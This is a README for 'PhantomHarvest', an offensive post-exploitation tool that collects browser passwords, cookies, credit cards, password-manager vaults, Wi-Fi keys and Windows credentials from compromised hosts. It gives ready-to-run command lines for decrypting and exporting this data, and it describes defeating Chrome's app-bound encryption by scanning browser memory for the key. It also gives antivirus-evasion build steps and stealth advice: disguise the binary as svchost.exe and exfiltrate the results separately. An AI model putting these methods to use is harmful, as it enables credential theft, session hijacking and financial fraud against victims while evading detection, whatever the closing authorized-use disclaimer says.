# PhantomHarvest

```
╔═══════════════════════════════════════╗
║   PhantomHarvest — Credential Reaper  ║
╚═══════════════════════════════════════╝
```

A post-exploitation credential harvesting tool. Drop it on a target, run it, get every credential on the box — config files, browser passwords, shell history, cloud keys, Wi-Fi passwords, Windows Credential Manager, and more.

**Single binary. No dependencies. Cross-platform.**

## Features

### File & Config Scanning
- `.env`, `wp-config.php`, `web.config`, `appsettings.json`, `config.yml`
- Git remote URLs with embedded credentials
- Terraform state files (`.tfstate`, `.tfvars`)
- Docker Compose files, Kubernetes secrets
- SSH private keys (encrypted vs unencrypted detection)
- AWS/Azure/GCP cloud credential files

### Pattern Matching
- Passwords, secrets, tokens, API keys in any config file
- AWS access keys (`AKIA...`), GitHub tokens (`ghp_`), GitLab tokens (`glpat-`)
- Stripe keys, Slack tokens, JWTs
- Database connection strings (MySQL, PostgreSQL, MongoDB, Redis)
- Hashes (bcrypt, SHA-512, MD5crypt, NTLM)

### Shell History
- `.bash_history`, `.zsh_history`, `.mysql_history`, `.psql_history`
- Extracts passwords from `sshpass`, `mysql -p`, `PGPASSWORD=`, `curl -u`

### Browser Credentials
- Chrome, Edge, Brave, Firefox saved password databases
- Browser encryption keys (`Local State`)
- History scanning for URLs with embedded credentials (`user:pass@host`)
- Cookie databases (session hijacking)
- **Inline decryption** of Chromium passwords/cookies/credit cards/autofill and
  Firefox `logins.json` (no master password) — pass `-decrypt-browsers` to a
  binary built with `make build-full` (or any `*-full` target). See
  [Inline Browser Decryption](#inline-browser-decryption) below.

### Password Managers
- KeePass vaults (`.kdbx`, `.kdb`)
- 1Password, LastPass, Bitwarden, NordPass local data
- Unix `pass` store (GPG-encrypted)
- GPG keyrings

### Windows-Specific
- **Wi-Fi passwords** — extracts all saved network passwords
- **Windows Credential Manager** — enumerates stored credentials
- **DPAPI** — detects master keys and protected credential stores
- **RDP files** — parses `.rdp` files for server, username, encrypted password
- **Registry hive backups** — finds SAM/SYSTEM/SECURITY in repair/backup dirs
- **Unattend.xml** — Windows deployment files with base64 passwords
- **Windows Vault** — web credential storage

### Confidence Scoring
Every finding is rated **HIGH**, **MEDIUM**, or **LOW**:
- **HIGH** — real credentials (passwords, API keys, tokens in known credential files)
- **MEDIUM** — likely credentials (tokens in config files, encrypted password databases)
- **LOW** — possible credentials (code references, variable names)

## Quick Start

```bash
# Linux — scan the whole system
./phantom-harvest -path /

# Windows — scan user profile
.\phantom-harvest.exe -path "C:\Users\username"

# Only show HIGH confidence (real credentials)
./phantom-harvest -path /home/user -high-only

# JSON output
./phantom-harvest -path / -json > loot.json

# Limit scan depth
./phantom-harvest -path / -depth 5

# Exclude noisy paths
./phantom-harvest -path / -exclude "TikTok,Discord,node_modules"

# Quiet mode (no banner)
./phantom-harvest -path / -quiet
```

## Build

```bash
# Build for current OS
make build

# Build Linux static binary
make linux

# Build Windows binary
make windows

# Build both
make all
```

### Stealth Build (Full Obfuscation)

For engagements where AV evasion matters, use [garble](https://github.com/burrowers/garble) to obfuscate all Go symbols, string literals, and function names:

```bash
# Install garble
go install mvdan.cc/garble@latest

# Build obfuscated binaries
make garble-linux
make garble-windows
make garble-all
```

**What the stealth build does:**
- Obfuscates all Go function names and package paths
- Encrypts all string literals at compile time
- Strips debug info and symbol tables
- Command strings (cmdkey, netsh) are XOR-encrypted at runtime

**Additional OPSEC:**
- Rename the binary before deployment (e.g., `svchost.exe`, `update.bin`)
- Use `-quiet -json` flags to avoid terminal output
- Pipe JSON to a file and exfiltrate separately

## Inline Browser Decryption

The default `make build` produces a small, dependency-free binary that only
*locates* browser credential databases. To actually pull plaintext passwords,
cookies, credit cards, and autofill data out of Chromium-family browsers and
Firefox, build with the `decrypt` build tag:

```bash
# Build a binary with inline decryption support
make build-full          # current OS
make linux-full          # Linux amd64
make windows-full        # Windows amd64
make garble-windows-full # obfuscated + decrypt

# Run with the new flag
./phantom-harvest -path / -decrypt-browsers -high-only
```

**What it decrypts (per-OS, no external tooling):**

| Source | Linux | macOS | Windows |
|---|---|---|---|
| Chromium saved passwords | yes (libsecret + `peanuts` fallback) | yes (Keychain) | yes (DPAPI) |
| Chromium cookies (`Cookies` and `Network/Cookies`) | yes | yes | yes |
| Chromium credit cards + autofill (`Web Data`) | yes | yes | yes |
| Firefox `logins.json` (empty master password) | yes | yes | yes |

Decryption uses `modernc.org/sqlite` (pure-Go, no CGO) so the resulting binary
is still a single static executable. If a Chromium master key cannot be
unwrapped (e.g. no keyring) or a Firefox profile has a master password set,
PhantomHarvest emits a `decrypt_failed` finding instead of crashing and falls
back to discovery-only output for that profile.

The default (non-`decrypt`) build keeps the binary tiny and ships zero
crypto/sqlite dependencies — useful when you only need recon and want to keep
the dropper small.

### Chrome v20 App-Bound Encryption (Chrome 127+)

Chrome 127+ protects saved passwords with a second AES-256 key whose wrapper
can only be decrypted by the Chrome ElevationService (running as SYSTEM).
PhantomHarvest defeats this without elevation using **two automatic fallbacks**:

1. **IElevator COM** — calls `DecryptData` via Chrome's elevation service. Works
   on Chrome < 130 or when running as SYSTEM. Chrome 130+ added binary signature
   verification that blocks unsigned callers.
2. **Process memory scan** — when Chrome is running, the decrypted AES-256 key
   lives in heap memory. PhantomHarvest enumerates `chrome.exe` / `msedge.exe` /
   `brave.exe` heap pages, extracts every 32-byte high-entropy candidate, and
   validates each one against a known ciphertext from Login Data using AES-GCM
   (false positive rate ≈ 2⁻¹²⁸). **Browser must be open** for this to work.

```bash
# Decrypt passwords while Chrome is running (v20 memory scan fires automatically)
phantom-harvest.exe -decrypt-browsers -browser chrome -logins-only -high-only
```

If both methods fail (browser closed, Chrome 130+ with SYSTEM check), the tool
reports a `v20_locked` finding and suggests alternatives:

```bash
# Supply a pre-extracted key (from memory dump / pypykatz / secretsdump)
phantom-harvest.exe -chrome-key <32-byte-hex> -browser chrome -logins-only

# Supply a DPAPI masterkey (auto-derives Chrome key from Local State blob)
phantom-harvest.exe -dpapi-masterkey <64-byte-hex> -browser chrome -logins-only
```

### SharpChrome-Equivalent Features

```bash
# Target specific browsers
phantom-harvest.exe -decrypt-browsers -browser chrome,edge

# Filter cookies by domain
phantom-harvest.exe -decrypt-browsers -domain .office.com -cookies-out office_cookies.txt

# Passwords only, skip cookies/history/autofill/cards
phantom-harvest.exe -decrypt-browsers -logins-only -browser chrome

# Export decrypted cookies in Netscape format (curl/wget compatible)
phantom-harvest.exe -decrypt-browsers -browser chrome -cookies-out cookies.txt
```

## Usage

```
Usage: phantom-harvest [options]

Options:
  -path string               Root directory to scan (default "/")
  -depth int                 Maximum directory depth (default 20)
  -high-only                 Only show HIGH confidence findings
  -json                      Output as JSON
  -quiet                     No banner output
  -exclude string            Comma-separated paths to exclude
  -decrypt-browsers          Inline-decrypt browser passwords/cookies/cards
                             (requires a binary built with `make build-full`)
  -browser string            Only scan specific browser(s): chrome,edge,firefox,brave
  -domain string             Filter cookies by domain substring (e.g. google.com)
  -logins-only               Extract only saved passwords, skip all else
  -cookies-out string        Export decrypted cookies in Netscape format
  -chrome-key string         Pre-decrypted Chrome AES key as hex (remote DPAPI)
  -dpapi-masterkey string    DPAPI masterkey as hex — auto-decrypts Chrome Local State
  -o string                  Output file (auto-detects .json/.csv/.txt/.html)
  -csv string                Export to CSV
  -txt string                Export to TXT
  -html string               Export to HTML report
```

## Example Output

```
╔═══════════════════════════════════════════════════════════╗
║  HARVEST SUMMARY                                          ║
╠═══════════════════════════════════════════════════════════╣
║  HIGH: 37    MEDIUM: 111   LOW: 45    TOTAL: 193         ║
╠═══════════════════════════════════════════════════════════╣
║  File Scan            178 findings                        ║
║  WiFi                  12 findings                        ║
║  Windows                3 findings                        ║
╚═══════════════════════════════════════════════════════════╝

── WiFi (12) ──

  [HIGH]   netsh wlan
           MyNetwork            → MyPassword123

── Windows (3) ──

  [HIGH]   Windows Credential Manager
           TERMSRV/10.10.10.5   → User: admin
```

## Use Cases

- **Post-exploitation** — drop on a compromised host, harvest everything
- **Red team assessments** — quickly find credentials for lateral movement
- **Security audits** — scan systems for credential exposure
- **Incident response** — identify what an attacker could have accessed

## Disclaimer

**For authorized security testing only.** Do not use this tool without explicit written permission from the system owner.

## Author

**Opeyemi Kolawole** — [GitHub](https://github.com/phantom-offensive)

## License

MIT
